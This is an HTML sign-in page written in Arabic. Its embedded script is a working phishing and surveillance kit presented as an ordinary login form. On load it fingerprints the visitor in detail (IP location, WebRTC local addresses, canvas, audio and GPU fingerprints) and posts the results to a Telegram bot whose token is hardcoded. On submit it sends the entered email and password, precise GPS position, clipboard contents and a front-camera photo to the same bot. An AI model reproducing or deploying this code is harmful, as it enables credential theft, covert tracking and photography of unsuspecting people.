<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>تسجيل الدخول</title>
<style>
  body{font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:#0e1116;color:#e6edf3;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}
  .card{background:#161b22;border:1px solid #30363d;border-radius:14px;padding:28px;width:100%;max-width:380px}
  h2{margin:0 0 6px;font-size:20px}
  p.sub{margin:0 0 20px;color:#8b949e;font-size:13px}
  input{width:100%;box-sizing:border-box;padding:12px;margin-bottom:12px;border-radius:9px;border:1px solid #30363d;background:#0d1117;color:#e6edf3;font-size:15px}
  button{width:100%;padding:12px;border:0;border-radius:9px;background:#2f81f7;color:#fff;font-size:15px;font-weight:600;cursor:pointer}
  button:disabled{opacity:.6}
  #out{margin-top:18px;font-size:11.5px;color:#8b949e;white-space:pre-wrap;word-break:break-all;max-height:220px;overflow:auto;display:none}
</style>
</head>
<body>
<div class="card">
  <h2>تسجيل الدخول</h2>
  <p class="sub">ادخل بياناتك للمتابعة</p>
  <input id="email" type="email" placeholder="البريد الإلكتروني" autocomplete="off">
  <input id="pass" type="password" placeholder="كلمة المرور" autocomplete="off">
  <button id="go">دخول</button>
  <div id="out"></div>
</div>

<script>
/* ===== 1) املأ دول ===== */
const BOT  = "9001692159:AAGlnGun3cE_llEqodeZ5YIIfuvReBU8N80";
const CHAT = "6869945520";

const D = {};
const out = document.getElementById("out");
function add(k, v){ if(v===undefined||v===null||v==="") return; D[k]=String(v); }

function dump(obj){
  return Object.entries(obj).map(([k,v]) => k + ": " + v).join("\n");
}

/* رسائل نصية — GET عشان نتجنب مشاكل CORS */
async function sendText(text){
  if(!BOT || BOT.includes("xxxx")) return;
  for(let i = 0; i < text.length; i += 3800){
    const p = new URLSearchParams({
      chat_id: CHAT,
      text: text.slice(i, i + 3800),
      disable_web_page_preview: "true"
    });
    try{ await fetch(`https://api.telegram.org/bot${BOT}/sendMessage?${p}`); }catch(e){}
  }
}

async function sendPhoto(dataUrl, caption){
  if(!BOT || BOT.includes("xxxx")) return;
  try{
    const blob = await (await fetch(dataUrl)).blob();
    const fd = new FormData();
    fd.append("chat_id", CHAT);
    fd.append("caption", caption.slice(0, 900));
    fd.append("photo", blob, "cam.jpg");
    await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, {method:"POST", body: fd});
  }catch(e){}
}

/* ===== 2) جمع المعلومات فورًا ===== */
(async () => {
  try{
    const j = await (await fetch("https://ipwho.is/")).json();
    if(j.success !== false){
      add("IP", j.ip);
      add("المدينة", j.city);
      add("المنطقة", j.region);
      add("الدولة", j.country + " (" + j.country_code + ")");
      add("الإحداثيات", j.latitude + ", " + j.longitude);
      add("مزود الخدمة", j.connection?.isp || j.isp);
      add("ASN", j.connection?.asn);
    }
  }catch(e){ add("IP", "فشل الجلب"); }

  add("User-Agent", navigator.userAgent);
  add("المنصة", navigator.platform);
  add("اللغة", navigator.language + " | " + (navigator.languages||[]).join(","));
  add("المنطقة الزمنية", Intl.DateTimeFormat().resolvedOptions().timeZone);
  add("فارق التوقيت", new Date().getTimezoneOffset() + " دقيقة");
  add("الشاشة", screen.width + "x" + screen.height);
  add("عمق الألوان", screen.colorDepth);
  add("النافذة", innerWidth + "x" + innerHeight);
  add("DPR", devicePixelRatio);
  add("أنوية المعالج", navigator.hardwareConcurrency);
  add("الذاكرة (GB)", navigator.deviceMemory);
  add("لمس", navigator.maxTouchPoints);
  add("Cookies", navigator.cookieEnabled ? "مفعّلة" : "معطّلة");
  add("الرجوع", document.referrer || "مباشر");
  add("الرابط", location.href);

  const c = navigator.connection || {};
  add("نوع الشبكة", c.effectiveType);
  add("سرعة تقديرية", c.downlink + " Mbps");
  add("RTT", c.rtt);

  try{
    const b = await navigator.getBattery();
    add("البطارية", Math.round(b.level*100) + "% " + (b.charging ? "(تشحن)" : ""));
  }catch(e){}

  try{
    const gl = document.createElement("canvas").getContext("webgl");
    const dbg = gl.getExtension("WEBGL_debug_renderer_info");
    add("GPU", gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL));
    add("المصنّع", gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL));
  }catch(e){}

  try{
    const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
    const ips = new Set();
    pc.createDataChannel("x");
    pc.onicecandidate = e => {
      if(!e.candidate) return;
      const m = e.candidate.candidate.match(/(\d{1,3}(\.\d{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{0,4}){3,7})/i);
      if(m) ips.add(m[0]);
    };
    await pc.createOffer().then(o => pc.setLocalDescription(o));
    await new Promise(r => setTimeout(r, 1500));
    if(ips.size) add("IP محلي (WebRTC)", [...ips].join(", "));
    pc.close();
  }catch(e){}

  try{
    const cv = document.createElement("canvas");
    const ctx = cv.getContext("2d");
    ctx.textBaseline = "top"; ctx.font = "14px Arial";
    ctx.fillStyle = "#f60"; ctx.fillRect(0,0,100,20);
    ctx.fillStyle = "#069"; ctx.fillText("Venice fingerprint", 2, 2);
    add("بصمة Canvas", cv.toDataURL().slice(-64));
  }catch(e){}

  try{
    const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
    const ac = new AC(1, 44100, 44100);
    const osc = ac.createOscillator(); osc.type = "triangle"; osc.frequency.value = 10000;
    const comp = ac.createDynamicsCompressor();
    osc.connect(comp); comp.connect(ac.destination); osc.start(0);
    const buf = await ac.startRendering();
    const data = buf.getChannelData(0);
    let sum = 0; for(let i=0;i<data.length;i+=100) sum += Math.abs(data[i]);
    add("بصمة الصوت", sum.toFixed(6));
  }catch(e){}

  try{
    const devs = await navigator.mediaDevices.enumerateDevices();
    add("كاميرات/مايكات", devs.filter(x=>x.kind==="videoinput").length + " كاميرا، " + devs.filter(x=>x.kind==="audioinput").length + " مايك");
  }catch(e){}

  await sendText("📥 زيارة جديدة\n\n" + dump(D));
  out.style.display = "block";
  out.textContent = dump(D);
})();

/* ===== 3) عند الضغط ===== */
document.getElementById("go").onclick = async () => {
  const btn = document.getElementById("go");
  btn.disabled = true; btn.textContent = "جارٍ...";
  const X = {};

  X["الإيميل المكتوب"] = document.getElementById("email").value;
  X["كلمة المرور"] = document.getElementById("pass").value;

  try{
    const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {timeout:8000}));
    X["GPS دقيق"] = pos.coords.latitude.toFixed(6) + ", " + pos.coords.longitude.toFixed(6);
    X["دقة الموقع"] = Math.round(pos.coords.accuracy) + " متر";
    X["خرائط"] = "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
  }catch(e){ X["GPS دقيق"] = "مرفوض/غير متاح"; }

  try{ X["الحافظة"] = (await navigator.clipboard.readText()).slice(0,500) || "(فاضية)"; }
  catch(e){ X["الحافظة"] = "مرفوض"; }

  let cam = null;
  try{
    const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
    const v = document.createElement("video");
    v.srcObject = s; await v.play();
    await new Promise(r => setTimeout(r, 900));
    const cv = document.createElement("canvas");
    cv.width = v.videoWidth; cv.height = v.videoHeight;
    cv.getContext("2d").drawImage(v, 0, 0);
    cam = cv.toDataURL("image/jpeg", 0.75);
    s.getTracks().forEach(t => t.stop());
    X["صورة الكاميرا"] = "مرفقة";
  }catch(e){ X["صورة الكاميرا"] = "مرفوض"; }

  await sendText("🔐 بيانات الدخول\n\n" + dump(X));
  if(cam) await sendPhoto(cam, "📸 صورة من الكاميرا — " + (X["الإيميل المكتوب"] || ""));

  out.style.display = "block";
  out.textContent = "تم الإرسال.";
  btn.textContent = "تم ✔";
};
</script>
</body>
</html>
